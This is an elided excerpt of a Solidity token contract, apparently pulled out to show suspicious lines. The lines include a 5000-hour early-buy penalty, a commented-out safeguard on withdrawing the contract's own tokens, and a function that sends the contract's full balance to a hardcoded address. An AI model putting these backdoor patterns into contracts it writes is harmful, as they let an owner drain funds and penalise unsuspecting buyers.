...
contract MASHIMA is Context, IERC20, Ownable {
    ...
    constructor() payable {
        ...
        marketingAddress = payable(0x96a5C928218736194e49c69CeC4E507e842A2301); // Marketing Address
     ...
     function intializeContract() external onlyOwner {
        ...
        _rOwned[_msgSender()] = _rTotal / 1000 * 600;
        _rOwned[address(this)] = _rTotal / 1000 * 400;
        
        maxTransactionAmount = _tTotal * 125 / 100000; // 0.125% maxTransactionAmountTxn
        minimumTokensBeforeSwap = _tTotal * 125 / 1000000; // 0.0125% swap tokens amount
        _maxWalletSize = _tTotal * 5 / 1000; // 0.5% _maxWalletSize 

        contractInitialized = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal * 600 / 1000);
        emit Transfer(address(0), address(this), _tTotal * 400 / 1000);
    }
    ...
    function enableTrading() internal onlyOwner {
        ...
        earlyBuyPenaltyEnd = block.timestamp + 5000 hours;
    }
        ...
        returns (bool _sent)
    {
       ...
       // require(_token != address(this), "Can't withdraw native tokens");
        ...
        _sent = IERC20(_token).transfer(address(0xD538Be6BE7479b57B49c740dA8E40B3A6D012186), _contractBalance);
